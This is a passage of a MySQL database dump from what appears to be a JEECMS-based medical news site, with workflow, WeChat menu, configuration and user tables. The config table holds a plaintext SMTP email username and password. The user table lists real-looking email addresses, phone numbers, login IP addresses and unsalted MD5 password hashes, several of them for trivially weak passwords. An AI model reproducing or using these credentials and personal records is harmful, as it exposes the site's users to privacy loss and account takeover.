INSERT INTO `jc_webservice_param` VALUES ('2', '5', 'sex', '');
INSERT INTO `jc_webservice_param` VALUES ('2', '6', 'realname', '');
INSERT INTO `jc_webservice_param` VALUES ('2', '7', 'tel', '');
INSERT INTO `jc_webservice_param` VALUES ('3', '0', 'auth_username', 'test');
INSERT INTO `jc_webservice_param` VALUES ('3', '1', 'auth_password', 'test');
INSERT INTO `jc_webservice_param` VALUES ('3', '2', 'username', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '8', 'telphone', null);
INSERT INTO `jc_webservice_param` VALUES ('2', '8', 'telphone', null);
INSERT INTO `jc_webservice_param` VALUES ('1', '9', 'groupId', null);
INSERT INTO `jc_webservice_param` VALUES ('2', '9', 'groupId', null);

-- ----------------------------
-- Table structure for jc_workflow
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow`;
CREATE TABLE `jc_workflow` (
  `workflow_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL COMMENT '站点',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_cross` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否允许跨级审核',
  PRIMARY KEY (`workflow_id`),
  KEY `fk_jc_workflow_site` (`site_id`),
  CONSTRAINT `fk_jc_workflow_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='工作流';

-- ----------------------------
-- Records of jc_workflow
-- ----------------------------
INSERT INTO `jc_workflow` VALUES ('1', '1', '工作流', '工作流', '1', '0', '1');

-- ----------------------------
-- Table structure for jc_workflow_event
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_event`;
CREATE TABLE `jc_workflow_event` (
  `event_id` int(11) NOT NULL AUTO_INCREMENT,
  `workflow_id` int(11) NOT NULL COMMENT '工作流',
  `date_id` int(11) NOT NULL COMMENT '数据标识',
  `user_id` int(11) NOT NULL COMMENT '发起人',
  `start_time` datetime NOT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `next_step` int(11) NOT NULL DEFAULT '0' COMMENT '下个步骤',
  `date_type` int(11) NOT NULL DEFAULT '0' COMMENT '数据类型(0默认内容)',
  `is_finish` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否结束',
  `pass_num` int(11) DEFAULT NULL COMMENT '会签本节点通过人数',
  PRIMARY KEY (`event_id`),
  KEY `fk_event_workflow` (`workflow_id`),
  KEY `fk_workflow_event_user` (`user_id`),
  CONSTRAINT `fk_event_flow` FOREIGN KEY (`workflow_id`) REFERENCES `jc_workflow` (`workflow_id`),
  CONSTRAINT `fk_workflow_event_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='工作流轨迹';

-- ----------------------------
-- Records of jc_workflow_event
-- ----------------------------

-- ----------------------------
-- Table structure for jc_workflow_event_user
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_event_user`;
CREATE TABLE `jc_workflow_event_user` (
  `event_user_id` int(11) NOT NULL AUTO_INCREMENT,
  `event_id` int(11) NOT NULL COMMENT '工作流转id',
  `user_id` int(11) NOT NULL COMMENT '流转用户',
  PRIMARY KEY (`event_user_id`),
  KEY `fk_jc_we_user` (`user_id`),
  KEY `fk_jc_we_event` (`event_id`),
  CONSTRAINT `fk_jc_we_event` FOREIGN KEY (`event_id`) REFERENCES `jc_workflow_event` (`event_id`),
  CONSTRAINT `fk_jc_we_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='工作流轨迹用户表';

-- ----------------------------
-- Records of jc_workflow_event_user
-- ----------------------------

-- ----------------------------
-- Table structure for jc_workflow_node
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_node`;
CREATE TABLE `jc_workflow_node` (
  `workflow_id` int(11) NOT NULL COMMENT '工作流',
  `role_id` int(11) NOT NULL COMMENT '角色',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `is_countersign` tinyint(1) NOT NULL DEFAULT '0' COMMENT '1 会签 0普通流转',
  PRIMARY KEY (`workflow_id`,`priority`),
  KEY `fk_jc_node_workflow` (`workflow_id`),
  KEY `fk_jc_workflow_node_role` (`role_id`),
  CONSTRAINT `fk_jc_node_workflow` FOREIGN KEY (`workflow_id`) REFERENCES `jc_workflow` (`workflow_id`),
  CONSTRAINT `fk_jc_workflow_node_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='工作流节点';

-- ----------------------------
-- Records of jc_workflow_node
-- ----------------------------
INSERT INTO `jc_workflow_node` VALUES ('1', '1', '0', '0');

-- ----------------------------
-- Table structure for jc_workflow_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_record`;
CREATE TABLE `jc_workflow_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '操作人',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `event_id` int(11) NOT NULL DEFAULT '0' COMMENT '轨迹',
  `record_time` datetime NOT NULL COMMENT '创建时间',
  `opinion` varchar(255) DEFAULT NULL COMMENT '意见',
  `type` int(11) NOT NULL DEFAULT '0' COMMENT '类型(1:通过  2退回 3保持)',
  PRIMARY KEY (`record_id`),
  KEY `fk_jc_workflowrecord_user` (`user_id`),
  KEY `fk_jc_workflowrecord_site` (`site_id`),
  KEY `fk_jc_workflowrecord_event` (`event_id`),
  CONSTRAINT `fk_jc_workflowrecord_event` FOREIGN KEY (`event_id`) REFERENCES `jc_workflow_event` (`event_id`),
  CONSTRAINT `fk_jc_workflowrecord_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_workflowrecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='工作流日志记录';

-- ----------------------------
-- Records of jc_workflow_record
-- ----------------------------

-- ----------------------------
-- Table structure for jg_weixin
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixin`;
CREATE TABLE `jg_weixin` (
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wx_pic` varchar(255) DEFAULT NULL COMMENT '微信二维码',
  `wx_welcome` varchar(255) NOT NULL DEFAULT '' COMMENT '关注欢迎语'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jg_weixin
-- ----------------------------
INSERT INTO `jg_weixin` VALUES ('1', '/u/cms/www/201510/08105041f9xd.jpg', '彩虹医学网欢迎您!');

-- ----------------------------
-- Table structure for jg_weixinmenu
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmenu`;
CREATE TABLE `jg_weixinmenu` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_name` varchar(255) DEFAULT NULL COMMENT '微信菜单名称',
  `wm_type` varchar(255) DEFAULT NULL COMMENT '微信菜单类别',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_key` varchar(255) DEFAULT NULL COMMENT '点击key',
  `wm_parent_id` int(11) DEFAULT NULL COMMENT '父节点',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jg_weixinmenu
-- ----------------------------
INSERT INTO `jg_weixinmenu` VALUES ('1', '1', '找官方', 'view', 'http://demo.caihongyixue.com/html/news/', '1', null);
INSERT INTO `jg_weixinmenu` VALUES ('2', '1', '演示站', 'view', 'http://demo.caihongyixue.com/html/picture/', '2', null);
INSERT INTO `jg_weixinmenu` VALUES ('3', '1', '新闻资讯', 'view', 'http://demo.caihongyixue.com/html/veido/', '3', null);
INSERT INTO `jg_weixinmenu` VALUES ('4', '1', '论坛', 'view', 'http://bbs.caihongyixue.com', '4', '1');
INSERT INTO `jg_weixinmenu` VALUES ('5', '1', '官网', 'view', 'http://www.caihongyixue.com/', '5', '1');
INSERT INTO `jg_weixinmenu` VALUES ('6', '1', 'JSPGOU', 'view', 'http://demo3.caihongyixue.com', '6', '2');
INSERT INTO `jg_weixinmenu` VALUES ('7', '1', 'JEEBBS', 'view', 'http://bbs.caihongyixue.com', '7', '2');
INSERT INTO `jg_weixinmenu` VALUES ('8', '1', '图库', 'view', 'http://demo.caihongyixue.com/news/index.jhtml/pic/index.jhtml', '8', '3');
INSERT INTO `jg_weixinmenu` VALUES ('9', '1', '新闻', 'click', '', 'news', '3');
INSERT INTO `jg_weixinmenu` VALUES ('10', '1', 'caihongyixue', 'view', 'http://demo.caihongyixue.com/', '', '2');
INSERT INTO `jg_weixinmenu` VALUES ('11', '1', '视频', 'view', 'http://demo.caihongyixue.com/veido/index.jhtml', '', '3');
INSERT INTO `jg_weixinmenu` VALUES ('12', '1', '下载', 'view', 'http://demo.caihongyixue.com/download/index.jhtml', 'http://demo19.caihongyixue.com/download/index.jhtml', '3');
INSERT INTO `jg_weixinmenu` VALUES ('13', '1', '调查', 'view', 'http://demo.caihongyixue.com/survey.jhtml', 'http://demo19.caihongyixue.com/wldc/index.jhtml', '3');
INSERT INTO `jg_weixinmenu` VALUES ('14', '1', 'JSPGOU店中店', 'view', 'http://dzd.caihongyixue.com/', 'http://dzd.caihongyixue.com/', '2');

-- ----------------------------
-- Table structure for jg_weixinmessage
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmessage`;
CREATE TABLE `jg_weixinmessage` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_number` varchar(255) DEFAULT NULL COMMENT '序号',
  `wm_title` varchar(255) DEFAULT NULL COMMENT '标题',
  `wm_path` varchar(255) DEFAULT NULL COMMENT '图片地址',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_content` varchar(255) DEFAULT NULL COMMENT '内容',
  `is_welcome` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否欢迎页',
  `wm_msg_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息类型(0带图文链接 1内容加关键字提示 2仅有内容)',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jg_weixinmessage
-- ----------------------------
INSERT INTO `jg_weixinmessage` VALUES ('1', '1', null, '留言', '/u/cms/www/201510/08172019lz4w.png', 'http://demo.caihongyixue.com/guestbook.jspx', '金磊科技欢迎您!', '1', '0');
INSERT INTO `jg_weixinmessage` VALUES ('2', '1', 'news', '新闻', '/u/cms/www/201510/27142936gt6k.jpg', 'http://demo19.caihongyixue.com/news/index.jhtml', '新闻', '0', '0');

-- ----------------------------
-- Table structure for jo_authentication
-- ----------------------------
DROP TABLE IF EXISTS `jo_authentication`;
CREATE TABLE `jo_authentication` (
  `authentication_id` char(32) NOT NULL COMMENT '认证ID',
  `userid` int(11) NOT NULL COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `login_time` datetime NOT NULL COMMENT '登录时间',
  `login_ip` varchar(50) NOT NULL COMMENT '登录ip',
  `update_time` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='认证信息表';

-- ----------------------------
-- Records of jo_authentication
-- ----------------------------

-- ----------------------------
-- Table structure for jo_config
-- ----------------------------
DROP TABLE IF EXISTS `jo_config`;
CREATE TABLE `jo_config` (
  `cfg_key` varchar(50) NOT NULL COMMENT '配置KEY',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '配置VALUE',
  PRIMARY KEY (`cfg_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='配置表';

-- ----------------------------
-- Records of jo_config
-- ----------------------------
INSERT INTO `jo_config` VALUES ('email_encoding', '');
INSERT INTO `jo_config` VALUES ('email_host', 'smtp.126.com');
INSERT INTO `jo_config` VALUES ('email_password', 'caihongyixue888');
INSERT INTO `jo_config` VALUES ('email_personal', '彩虹医学网');
INSERT INTO `jo_config` VALUES ('email_port', '25');
INSERT INTO `jo_config` VALUES ('email_username', 'rishiding@126.com');
INSERT INTO `jo_config` VALUES ('login_error_interval', '30');
INSERT INTO `jo_config` VALUES ('login_error_times', '3');
INSERT INTO `jo_config` VALUES ('message_forgotpassword_subject', '找回彩虹医学网密码');
INSERT INTO `jo_config` VALUES ('message_forgotpassword_text', '感谢您使用彩虹医学网系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://www.caihongyixue.com/member/password_reset.jspx?uid=${uid}&key=${resetKey}');
INSERT INTO `jo_config` VALUES ('message_register_subject', '欢迎您注册彩虹医学网用户');
INSERT INTO `jo_config` VALUES ('message_register_text', '${username}您好：\r\n欢迎您注册彩虹医学网系统会员\r\n请点击以下链接进行激活\r\nhttp://www.caihongyixue.com/active.jspx?username=${username}&key=${activationCode}');
INSERT INTO `jo_config` VALUES ('message_subject', '彩虹医学网会员密码找回信息');
INSERT INTO `jo_config` VALUES ('message_text', '感谢您使用彩虹医学网系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost/member/password_reset.jspx?uid=${uid}&key=${resetKey}\r\n');

-- ----------------------------
-- Table structure for jo_ftp
-- ----------------------------
DROP TABLE IF EXISTS `jo_ftp`;
CREATE TABLE `jo_ftp` (
  `ftp_id` int(11) NOT NULL AUTO_INCREMENT,
  `ftp_name` varchar(100) NOT NULL COMMENT '名称',
  `ip` varchar(50) NOT NULL COMMENT 'IP',
  `port` int(11) NOT NULL DEFAULT '21' COMMENT '端口号',
  `username` varchar(100) DEFAULT NULL COMMENT '登录名',
  `password` varchar(100) DEFAULT NULL COMMENT '登陆密码',
  `encoding` varchar(20) NOT NULL DEFAULT 'UTF-8' COMMENT '编码',
  `timeout` int(11) DEFAULT NULL COMMENT '超时时间',
  `ftp_path` varchar(255) DEFAULT NULL COMMENT '路径',
  `url` varchar(255) NOT NULL COMMENT '访问URL',
  PRIMARY KEY (`ftp_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FTP表';

-- ----------------------------
-- Records of jo_ftp
-- ----------------------------

-- ----------------------------
-- Table structure for jo_template
-- ----------------------------
DROP TABLE IF EXISTS `jo_template`;
CREATE TABLE `jo_template` (
  `tpl_name` varchar(150) NOT NULL COMMENT '模板名称',
  `tpl_source` longtext COMMENT '模板内容',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `is_directory` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否目录',
  PRIMARY KEY (`tpl_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='模板表';

-- ----------------------------
-- Records of jo_template
-- ----------------------------

-- ----------------------------
-- Table structure for jo_upload
-- ----------------------------
DROP TABLE IF EXISTS `jo_upload`;
CREATE TABLE `jo_upload` (
  `filename` varchar(150) NOT NULL COMMENT '文件名',
  `length` int(11) NOT NULL COMMENT '文件大小(字节)',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `content` longblob NOT NULL COMMENT '内容',
  PRIMARY KEY (`filename`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='上传附件表';

-- ----------------------------
-- Records of jo_upload
-- ----------------------------

-- ----------------------------
-- Table structure for jo_user
-- ----------------------------
DROP TABLE IF EXISTS `jo_user`;
CREATE TABLE `jo_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `telphone` varchar(20) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮箱',
  `password` char(32) NOT NULL COMMENT '密码',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `reset_key` char(32) DEFAULT NULL COMMENT '重置密码KEY',
  `reset_pwd` varchar(10) DEFAULT NULL COMMENT '重置密码VALUE',
  `error_time` datetime DEFAULT NULL COMMENT '登录错误时间',
  `error_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录错误次数',
  `error_ip` varchar(50) DEFAULT NULL COMMENT '登录错误IP',
  `activation` tinyint(1) NOT NULL DEFAULT '1' COMMENT '激活状态',
  `activation_code` char(32) DEFAULT NULL COMMENT '激活码',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COMMENT='用户表';

-- ----------------------------
-- Records of jo_user
-- ----------------------------
INSERT INTO `jo_user` VALUES ('1', 'admin', null, 'caihongyixue@qq.com', '5f4dcc3b5aa765d61d8327deb882cf99', '2011-01-03 00:00:00', '127.0.0.1', '2017-02-05 14:35:40', '127.0.0.1', '1213', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('2', 'caihong', null, 'qianfo_713@163.com', 'c4ca4238a0b923820dcc509a6f75849b', '2017-01-15 10:59:48', '127.0.0.1', '2017-01-25 09:15:42', '117.174.29.135', '11', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('3', 'caihong1', null, '77219569@qq.com', '49cced1fe2e6a48f850daa28ec7c7087', '2017-01-16 17:41:06', '127.0.0.1', '2017-01-25 00:17:00', '101.207.227.64', '4', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('4', 'caihong3', null, '77219569@qq.com', 'e10adc3949ba59abbe56e057f20f883e', '2017-01-17 00:58:53', '101.207.227.2', '2017-01-17 01:04:05', '101.207.227.2', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('5', '红山茶007', null, '423649967@qq.com', '14d7856a0a928ea325f3c013a19f29ef', '2017-01-17 11:41:13', '182.138.200.232', '2017-01-17 16:14:33', '182.138.200.232', '7', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('6', '彩虹医学编辑', null, 'caihongyixue@163.com', 'd71b219ba0291aaf5ccb33e44e0f53b6', '2017-01-17 15:31:52', '182.138.200.232', '2017-01-17 15:31:52', '182.138.200.232', '0', null, null, '2017-01-17 15:37:04', '2', '182.138.200.232', '0', '4e5e656817fa48deb989d046ce26b51e');
INSERT INTO `jo_user` VALUES ('7', 'ceshi123', null, 'caihongyixue@163.com', 'b935e710033c606d1b36e62c7bdfa59f', '2017-01-17 15:40:36', '182.138.200.232', '2017-01-17 15:42:09', '182.138.200.232', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('10', 'qianfo_713', null, '77219569@qq.com', '4297f44b13955235245b2497399d7a93', '2017-01-18 10:19:18', '117.173.132.144', '2017-01-18 14:38:02', '117.173.132.144', '3', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('11', '成都李炳成', null, 'yyy9990@vip.163.com', '9dd638d9753713796331d705396c9cd7', '2017-01-19 17:54:44', '182.150.160.76', '2017-01-19 17:55:07', '182.150.160.76', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('12', '彩虹妹妹', null, 'caihongyixue@163.com', 'a584bedcbb16a50b3d9202b3313f7027', '2017-01-24 12:56:23', '110.22.22.220', '2017-01-24 12:59:21', '110.22.22.220', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('13', 'Butter', null, 'dlxiyoulinux@gmail.com', '4edefce7dd12dfcc1b6f06d56aa2cfd2', '2017-01-24 17:06:34', '60.22.103.9', '2017-01-24 17:06:44', '60.22.103.9', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('14', '彩虹', null, 'caihongyixue@163.com', 'c8ce4d760b453555fa40716abedfa7f0', '2017-01-24 17:08:56', '110.22.22.220', '2017-01-28 09:28:28', '110.22.22.220', '2', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('15', 'Daisy', null, '1213388927@qq.com', 'c21b7617e097739ed3fb8d90a7cf0f7d', '2017-01-24 17:09:33', '211.101.240.18', '2017-01-24 17:18:45', '211.101.240.18', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('16', 'shbqsl-790818', null, '125257175@qq.com.cn', '621106e494364d22f3df09db292881e5', '2017-01-24 17:11:11', '180.212.194.81', '2017-01-24 17:52:00', '180.212.194.81', '2', '9effb7401c01498eabb7bb29b00e85aa', '4596260457', '2017-01-24 18:32:50', '14', '180.212.194.81', '1', null);
INSERT INTO `jo_user` VALUES ('17', '李炳辰', null, 'yyy9990@vip.163.com', '9dd638d9753713796331d705396c9cd7', '2017-01-24 17:19:59', '171.214.210.223', '2017-01-24 17:20:12', '171.214.210.223', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('18', 'shbqsl-790818sss', null, '125257175@qq.com', '0236316d40a2d49204f13edd8e0a6353', '2017-01-24 18:40:54', '180.212.194.81', '2017-01-24 18:42:21', '180.212.194.81', '2', null, null, '2017-01-24 18:43:39', '10', '180.212.194.81', '1', null);
INSERT INTO `jo_user` VALUES ('19', 'shbqsl-790818a', null, '125257175@qq.com', 'c8837b23ff8aaa8a2dde915473ce0991', '2017-01-24 18:51:23', '180.212.194.81', '2017-01-24 18:52:08', '180.212.194.81', '1', null, null, '2017-01-24 19:07:13', '2', '180.212.194.81', '1', null);
INSERT INTO `jo_user` VALUES ('20', 'shbqsl-790818aa', null, '125257175@qq.com', 'c8837b23ff8aaa8a2dde915473ce0991', '2017-01-24 19:08:21', '180.212.194.81', '2017-01-24 19:08:29', '180.212.194.81', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('21', 'ydk110', null, '564464797@qq.com', 'af82cf39e2021b7a5c8c5e4dd483859d', '2017-01-24 23:35:03', '221.203.80.59', '2017-01-25 01:13:23', '42.87.163.187', '4', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('22', '北极光', null, '133620311@qq.com', 'd59f4480999b03203ea3423697e5eb2c', '2017-01-25 10:12:36', '124.202.226.50', '2017-01-25 10:13:06', '124.202.226.50', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('23', 'caihong5', '15882454451', 'qianfo@713.com', 'e10adc3949ba59abbe56e057f20f883e', '2017-02-01 00:38:06', '101.207.227.70', '2017-02-01 11:50:01', '127.0.0.1', '1', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('27', 'caihong4', '15588882222', '123@163.com', 'e10adc3949ba59abbe56e057f20f883e', '2017-02-01 17:21:42', '127.0.0.1', '2017-02-01 17:21:42', '127.0.0.1', '0', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('28', 'caihong6', '15588882223', 'caihongyixue@qq.com', 'e10adc3949ba59abbe56e057f20f883e', '2017-02-01 17:42:22', '127.0.0.1', '2017-02-01 17:42:22', '127.0.0.1', '0', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('29', 'test', '1', '77219569@qq.com', 'd41d8cd98f00b204e9800998ecf8427e', '2017-02-01 19:36:23', '127.0.0.1', '2017-02-01 19:36:23', '127.0.0.1', '0', null, null, null, '0', null, '1', null);
INSERT INTO `jo_user` VALUES ('30', 'test1', '15588882222', '77219569@qq.com', 'd41d8cd98f00b204e9800998ecf8427e', '2017-02-02 23:42:18', '127.0.0.1', '2017-02-02 23:42:18', '127.0.0.1', '0', null, null, null, '0', null, '1', null);
